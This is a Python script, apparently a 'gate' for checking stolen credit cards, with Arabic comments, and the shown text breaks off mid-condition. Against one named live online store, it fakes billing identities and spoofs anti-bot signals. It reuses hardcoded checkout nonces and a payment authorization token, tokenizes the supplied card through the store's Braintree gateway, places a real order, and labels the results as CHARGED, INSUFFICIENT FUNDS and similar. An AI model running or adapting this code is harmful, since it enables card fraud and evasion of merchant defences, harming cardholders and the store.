# ==================== gatet.py (الحل الجذري لمشكلة Session Expired) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_us_data():
    """توليد بيانات عنوان أمريكي صالح"""
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia',
                   'John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura', 'Roman', 'Kalid']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis',
                  'Caril', 'Hatleyb', 'Payne', 'Betran', 'Yabenk']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    us_states = ['AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA', 'HI', 'ID', 'IL', 'IN', 'IA', 
                 'KS', 'KY', 'LA', 'ME', 'MD', 'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ', 
                 'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC', 'SD', 'TN', 'TX', 'UT', 'VT', 
                 'VA', 'WA', 'WV', 'WI', 'WY', 'VI']
    us_cities = ['Los Angeles', 'Houston', 'Chicago', 'Brooklyn', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin',
                 'New York', 'Miami', 'Seattle', 'Denver', 'Boston', 'Atlanta', 'Detroit', 'Portland', 'Nashville', 'Kalidna']
    us_postcodes = ['90001', '77001', '60601', '11201', '85001', '19101', '78201', '92101', '75201', '73301', 
                    '10001', '33101', '98101', '80201', '02101', '30301', '48201', '97201', '37201', '76266']
    us_phones = ['2135551234', '7135551234', '3125551234', '7185551234', '6025551234', '2155551234', '12038783117']
    us_addresses = ['1 Rowe Ave', '123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Street', '654 Maple Drive', '7673 kanet ha']
    
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', '@gmail.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
        'phone': random.choice(us_phones),
        'address_1': random.choice(us_addresses),
        'city': random.choice(us_cities),
        'state': random.choice(us_states),
        'postcode': random.choice(us_postcodes),
        'company': f"{first}'s {random.choice(['Auto', 'Parts', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def get_fresh_session_data(session, url):
    """جلب بيانات جديدة من الموقع لتجنب Session Expired"""
    try:
        # زيارة الصفحة الرئيسية للمتجر
        shop_url = 'https://relentlessdefender.com/shop/?orderby=price'
        response = session.get(shop_url)
        
        # استخراج ct_checkjs
        ct_checkjs = None
        checkjs_match = re.search(r'name="ct_checkjs" value="([^"]+)"', response.text)
        if checkjs_match:
            ct_checkjs = checkjs_match.group(1)
        
        # استخراج ct_sfw_pass_key
        sfw_key = None
        sfw_match = re.search(r'ct_sfw_pass_key["\']?\s*:\s*["\']([^"\']+)', response.text)
        if not sfw_match:
            sfw_match = re.search(r'name="ct_sfw_pass_key" value="([^"]+)"', response.text)
        if sfw_match:
            sfw_key = sfw_match.group(1)
        
        # استخراج apbct_site_landing_ts
        landing_ts = str(int(time.time()) - random.randint(100, 500))
        
        print(f"[FRESH] Got ct_checkjs: {ct_checkjs[:20] if ct_checkjs else 'None'}...")
        print(f"[FRESH] Got sfw_key: {sfw_key[:20] if sfw_key else 'None'}...")
        
        return ct_checkjs, sfw_key, landing_ts
    except Exception as e:
        print(f"[FRESH] Error getting fresh data: {e}")
        return None, None, None

def ch(ccx):
    print("\n" + "="*70)
    print("[DEBUG] STARTING NEW CHECK - Relentless Defender")
    print("="*70)
    
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_us_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    print(f"[1/8] Using User-Agent: {user[:50]}...")
    print(f"[1/8] Generated fake data: {fake_data['first_name']} {fake_data['last_name']}, {fake_data['email']}")
    print(f"[1/8] State: {fake_data['state']}, City: {fake_data['city']}, Postcode: {fake_data['postcode']}")
    
    # ================ جلب بيانات جديدة من الموقع لتجنب Session Expired ================
    print("\n[2/8] Fetching fresh session data from website...")
    ct_checkjs, ct_sfw_pass_key, apbct_site_landing_ts = get_fresh_session_data(r, 'https://relentlessdefender.com/')
    
    # استخدام قيم احتياطية لو فشل الجلب
    if not ct_checkjs:
        ct_checkjs = '1479321219'
        print("[2/8] Using fallback ct_checkjs")
    if not ct_sfw_pass_key:
        ct_sfw_pass_key = '45f200cb6d172574893404ca34a253bb0'
        print("[2/8] Using fallback sfw_pass_key")
    if not apbct_site_landing_ts:
        apbct_site_landing_ts = str(int(time.time()) - random.randint(100, 500))
        print("[2/8] Generated fresh landing_ts")
    
    # توليد unique_session_id جديدة لكل فحص
    unique_session_id = str(uuid.uuid4())
    
    print(f"[2/8] Fresh ct_checkjs: {ct_checkjs[:20]}...")
    print(f"[2/8] Fresh unique_session_id: {unique_session_id[:20]}...")
    
    # ================ 3. ADD TO CART ================
    print("\n[3/8] Adding product to cart...")
    
    cookies_add = {
        'apbct_site_landing_ts': apbct_site_landing_ts,
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': ct_sfw_pass_key,
        'ct_mouse_moved': 'true',
        'ct_checkjs': ct_checkjs,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_has_scrolled': 'true',
        'unique_session_id': unique_session_id,
        'commercekit-nonce-value': 'fe5aa60a8a',
        'commercekit-nonce-state': '0',
    }
    
    headers_add = {
        'authority': 'relentlessdefender.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://relentlessdefender.com',
        'referer': 'https://relentlessdefender.com/shop/?orderby=price',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_add = {'wc-ajax': 'add_to_cart'}
    
    # ct_no_cookie_hidden_field متغير لكل طلب
    rand_suffix = random.randint(100000, 999999)
    ct_no_cookie = f'_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJhcGJjdF9leGlzdGluZ192aXNpdG9yIjoxLCJjdF9wc190aW1lc3RhbXAiOjE3NzkxNTM5NzQsImN0X2Nvb2tpZXNfdHlwZSI6Im5hdGl2ZSIsImFwYmN0X2hlYWRsZXNzIjpmYWxzZSwiYXBiY3RfcGFnZV9oaXRzIjo1LCJjdF9ma3BfdGltZXN0YW1wIjoiMCIsImN0X3BvaW50ZXJfZGF0YSI6IjAiLCJjdF9zY3JlZW5faW5mbyI6IntcImZ1bGxXaWR0aFwiOjM4NCxcImZ1bGxIZWlnaHRcIjozMzQ0LFwidmlzaWJsZVdpZHRoXCI6Mzg0LFwidmlzaWJsZUhlaWdodFwiOjc1OX0iLCJjdF9jaGVja2pzIjoxNDc5MzIxMjE5LCJjdF90aW1lem9uZSI6MywiYXBiY3Rfc2Vzc2lvbl9pZCI6InJsc2hwIiwiYXBiY3RfcHJldl9yZWZlcmVyIjoiaHR0cHM6Ly9yZWxlbnRsZXNzZGVmZW5kZXIuY29tL2NhcnQvIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3JlbGVudGxlc3NkZWZlbmRlci5jb20vc2hvcC8/b3JkZXJieT1wcmljZSJ9'
    
    data_add = f'data%5Bct_no_cookie_hidden_field%5D={ct_no_cookie}&success_message=%E2%80%9CReLEntless+Defender++Koozie+(Assorted+Colors)%E2%80%9D+has+been+added+to+your+cart&product_sku=KoozieBLW&product_id=785&quantity=1'
    
    response = r.post('https://relentlessdefender.com/', params=params_add, headers=headers_add, data=data_add, cookies=cookies_add)
    print(f"[3/8] Add to cart status: {response.status_code}")
    print(f"[3/8] Add to cart response: {response.text[:200]}")
    
    # التحقق من نجاح الإضافة (عدم وجود error)
    if response.status_code != 200 or '"error":true' in response.text:
        print(f"[3/8] WARNING: Add to cart may have failed!")
        # محاولة مرة أخرى
        time.sleep(2)
        response = r.post('https://relentlessdefender.com/', params=params_add, headers=headers_add, data=data_add, cookies=cookies_add)
        print(f"[3/8] Retry add to cart status: {response.status_code}")
    
    # ================ 4. WAIT SHORTLY (لتجنب Session Expired) ================
    print("\n[4/8] Short pause to avoid session expiration...")
    time.sleep(random.uniform(3, 6))
    
    # ================ 5. CHECKOUT PAGE ================
    print("\n[5/8] Accessing checkout page...")
    
    cookies_checkout = {
        'apbct_site_landing_ts': apbct_site_landing_ts,
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': ct_sfw_pass_key,
        'ct_mouse_moved': 'true',
        'ct_checkjs': ct_checkjs,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_has_scrolled': 'true',
        'unique_session_id': unique_session_id,
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': '37f96722f99c851ece19427eef0dafe0',
    }
    
    headers_checkout = {
        'authority': 'relentlessdefender.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://relentlessdefender.com/shop/?orderby=price',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
    }
    
    response = r.get('https://relentlessdefender.com/checkout/', cookies=cookies_checkout, headers=headers_checkout)
    print(f"[5/8] Checkout page status: {response.status_code}")
    
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    # ================ 6. EXTRACT TOKENS AND NONCES ================
    print("\n[6/8] Extracting tokens and nonces...")
    
    sec = re.search(r'wc-ajax=update_order_review[^"]*security[^"]*"?\s*value="([^"]+)"', response.text)
    if not sec:
        sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
    if sec:
        sec = sec.group(1)
        print(f"[6/8] Found update_order_review nonce: {sec[:20]}...")
    else:
        sec = '963b664cda'
        print("[6/8] WARNING: Using fallback nonce")
    
    check_nonce = re.search(r'woocommerce-process-checkout-nonce[^"]*"?\s*value="([^"]+)"', response.text)
    if not check_nonce:
        check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
    if check_nonce:
        check_nonce = check_nonce.group(1)
        print(f"[6/8] Found checkout nonce: {check_nonce[:20]}...")
    else:
        check_nonce = '7d83e94f9b'
        print("[6/8] WARNING: Using fallback checkout nonce")
    
    # استخراج الـ cart hash من الصفحة
    cart_hash_match = re.search(r'woocommerce_cart_hash["\']?\s*:\s*["\']([^"\']+)', response.text)
    if cart_hash_match:
        woocommerce_cart_hash = cart_hash_match.group(1)
        print(f"[6/8] Found cart hash: {woocommerce_cart_hash[:20]}...")
    else:
        woocommerce_cart_hash = 'ddabe99ae0cda44559fd21a62acd2cb6'
    
    # ================ 7. UPDATE ORDER REVIEW ================
    print("\n[7/8] Updating order review...")
    
    cookies_update = {
        'apbct_site_landing_ts': apbct_site_landing_ts,
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': ct_sfw_pass_key,
        'ct_mouse_moved': 'true',
        'ct_checkjs': ct_checkjs,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_has_scrolled': 'true',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': woocommerce_cart_hash,
        'unique_session_id': unique_session_id,
    }
    
    headers_update = {
        'authority': 'relentlessdefender.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://relentlessdefender.com',
        'referer': 'https://relentlessdefender.com/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=braintree_cc&country=&state=&postcode=&city=&address=&address_2=&s_country=&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Frelentlessdefender.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2026-05-19%252001%253A25%253A27%26wc_order_attribution_session_pages%3D6%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_first_name%3D%26billing_last_name%3D%26billing_company%3D%26billing_country%3D%26billing_address_1%3D%26billing_address_2%3D%26billing_city%3D%26billing_state%3D%26billing_postcode%3D%26billing_phone%3D%26billing_email%3D%26wc_apbct_email_id%3D%26bb30e59%3D0%26bb30e59%3D1%26e038059%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%26woocommerce-process-checkout-nonce%3D{check_nonce}%26_wp_http_referer%3D%252Fcheckout%252F'
    
    response = r.post('https://relentlessdefender.com/', params=params_update, headers=headers_update, data=data_update, cookies=cookies_update)
    print(f"[7/8] Update order review status: {response.status_code}")
    
    # التحقق من Session Expired في الـ response
    if 'session has expired' in response.text.lower():
        print("[7/8] ERROR: Session expired! Trying one more time with fresh session...")
        # محاولة إعادة الجلسة من البداية (تسجيل الدخول كجديد)
        r = requests.session()  # جلسة جديدة بالكامل
        time.sleep(5)
        # تكرار العملية من البداية (add to cart)
        response = r.post('https://relentlessdefender.com/', params=params_add, headers=headers_add, data=data_add)
        if response.status_code == 200 and '"error":true' not in response.text:
            print("[7/8] Retry add to cart successful")
            response = r.get('https://relentlessdefender.com/checkout/', headers=headers_checkout)
            if response.status_code == 200:
                # نعيد استخراج nonces
                sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
                if sec:
                    sec = sec.group(1)
                check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
                if check_nonce:
                    check_nonce = check_nonce.group(1)
                # نعيد update_order_review
                response = r.post('https://relentlessdefender.com/', params=params_update, headers=headers_update, data=data_update)
    
    print(f"[7/8] Update order review response: {response.text[:300]}")
    
    # ================ 8. TOKENIZE CREDIT CARD ================
    print("\n[8/8] Tokenizing credit card...")
    
    # استخراج الـ authorization fingerprint
    au_match = re.search(r'"authorizationFingerprint":"([^"]+)"', response.text)
    if not au_match:
        page_match = re.search(r'data-client-token="([^"]+)"', response.text)
        if page_match:
            try:
                dec = base64.b64decode(page_match.group(1)).decode('utf-8')
                au_match = re.search(r'"authorizationFingerprint":"([^"]+)"', dec)
            except:
                pass
    
    if au_match:
        au = au_match.group(1)
        print(f"[8/8] Got authorization fingerprint: {au[:50]}...")
    else:
        au = 'eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzkyNDA0MTMsImp0aSI6ImIzODJmMGE1LTQwZWEtNDUxYS1hN2QwLThjMjliOGY0NTJhNSIsInN1YiI6InF6bjdiNTl6enJxN2duMzkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF6bjdiNTl6enJxN2duMzkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyZWxlbnRsZXNzZGVmZW5kZXJhcHBhcmVsX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVJEUThtcmJ6ekhwcFFKU1J6N21uUHFscEFDTDBYeE9wU0YtSFJjV095bTBDZzNPTHVSd3piZzJQOUJvckpoZDdMeExqS0tNWnFGdndWUU8ifX0.T5Tl8cAlenOhToEr1XGaMYl47BRcTDRhYpLMrxgPFKQaE-RXGXhwLWWR_AK_jh9i11HKmoOsrKqa1rUMG3hOjQ'
        print(f"[8/8] Using fallback authorization fingerprint")
    
    headers_token = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    token_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data)
    print(f"[8/8] Tokenization status: {response.status_code}")
    
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
        print(f"[8/8] Got token: {tok[:30]}...")
    except Exception as e:
        print(f"[8/8] Tokenization failed: {e}")
        return f'TOKENIZATION_FAILED'
    
    # ================ 9. FINAL CHECKOUT ================
    print("\n[9/9] Processing final checkout...")
    
    cookies_final = {
        'apbct_site_landing_ts': apbct_site_landing_ts,
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': ct_sfw_pass_key,
        'ct_mouse_moved': 'true',
        'ct_checkjs': ct_checkjs,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_has_scrolled': 'true',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': woocommerce_cart_hash,
        'unique_session_id': unique_session_id,
    }
    
    headers_final = {
        'authority': 'relentlessdefender.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://relentlessdefender.com',
        'referer': 'https://relentlessdefender.com/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    apbct_visible = 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19maXJzdF9uYW1lIGJpbGxpbmdfbGFzdF9uYW1lIGJpbGxpbmdfY29tcGFueSBiaWxsaW5nX2NvdW50cnkgYmlsbGluZ19hZGRyZXNzXzEgYmlsbGluZ19hZGRyZXNzXzIgYmlsbGluZ19jaXR5IGJpbGxpbmdfc3RhdGUgYmlsbGluZ19wb3N0Y29kZSBiaWxsaW5nX3Bob25lIGJpbGxpbmdfZW1haWwgd2NfYXBiY3RfZW1haWxfaWQgc2hpcHBpbmdfZmlyc3RfbmFtZSBzaGlwcGluZ19sYXN0X25hbWUgc2hpcHBpbmdfY29tcGFueSBzaGlwcGluZ19jb3VudHJ5IHNoaXBwaW5nX2FkZHJlc3NfMSBzaGlwcGluZ19hZGRyZXNzXzIgc2hpcHBpbmdfY2l0eSBzaGlwcGluZ19zdGF0ZSBzaGlwcGluZ19wb3N0Y29kZSBvcmRlcl9jb21tZW50cyIsInZpc2libGVfZmllbGRzX2NvdW50IjoyMiwiaW52aXNpYmxlX2ZpZWxkcyI6IndjX29yZGVyX2F0dHJpYnV0aW9uX3NvdXJjZV90eXBlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3JlZmVycmVyIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jYW1wYWlnbiB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fc291cmNlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9tZWRpdW0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NvbnRlbnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2lkIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV90ZXJtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9zb3VyY2VfcGxhdGZvcm0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NyZWF0aXZlX2Zvcm1hdCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fbWFya2V0aW5nX3RhY3RpYyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX2VudHJ5IHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fc3RhcnRfdGltZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3BhZ2VzIHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fY291bnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXNlcl9hZ2VudCBiYjMwZTU5IGUwMzgwNTkgYnJhaW50cmVlX2NjX25vbmNlX2tleSBicmFpbnRyZWVfY2NfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2NjXzNkc19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhIGJyYWludHJlZV9wYXlwYWxfbm9uY2Vfa2V5IGJyYWludHJlZV9wYXlwYWxfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2FwcGxlcGF5X25vbmNlX2tleSBicmFpbnRyZWVfYXBwbGVwYXlfZGV2aWNlX2RhdGEgd29vY29tbWVyY2UtcHJvY2Vzcy1jaGVja291dC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6Mjh9fQ=='
    
    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Frelentlessdefender.com%2Fcart%2F&wc_order_attribution_session_start_time=2026-05-19+01%3A25%3A27&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_first_name={fake_data["first_name"]}&billing_last_name={fake_data["last_name"]}&billing_company=&billing_country=US&billing_address_1={fake_data["address_1"].replace(" ", "+")}&billing_address_2=&billing_city={fake_data["city"]}&billing_state={fake_data["state"]}&billing_postcode={fake_data["postcode"]}&billing_phone={fake_data["phone"]}&billing_email={fake_data["email"]}&wc_apbct_email_id=&bb30e59=0&e038059=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A18&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fqzn7b59zzrq7gn39%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fqzn7b59zzrq7gn39%22%7D%2C%22merchantId%22%3A%22qzn7b59zzrq7gn39%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22qzn7b59zzrq7gn39%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22fastlane%22%3A%7B%22enabled%22%3Atrue%2C%22tokensOnDemand%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Visa%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Relentless+Defender+Apparel%22%2C%22clientId%22%3A%22ARDQ8mrbzzHppQJSRz7mnPqlpACL0XxOpSF-HRcWOym0Cg3OLuRwzbg2P9BorJhd7LxLjKKMZqFvwVQO%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22relentlessdefenderapparel_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce={check_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields={apbct_visible}'
    
    response = r.post('https://relentlessdefender.com/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    print(f"[9/9] Final checkout status: {response.status_code}")
    
    # ================ 10. PARSE RESULT ================
    print("\n[10/10] Parsing result...")
    
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
        print(f"[10/10] Response JSON: {json.dumps(result_data, indent=2)[:500]}")
    except:
        print(f"[10/10] Raw response: {response.text[:500]}")
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"\n[DEBUG] Clean response: {search_text[:300]}")
    
    # ==================== ردود Braintree الكاملة والمفصلة ====================
    
    success_keywords = ['charged', 'success', 'completed', 'approved', 'payment successful', 'order received', 
                        'thank you for your order', 'order confirmed', 'transaction approved', 'payment completed']
    if any(keyword in search_text for keyword in success_keywords):
        return 'CHARGED'
    
    if 'insufficient funds' in search_text:
        return 'INSUFFICIENT FUNDS'
    
    if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
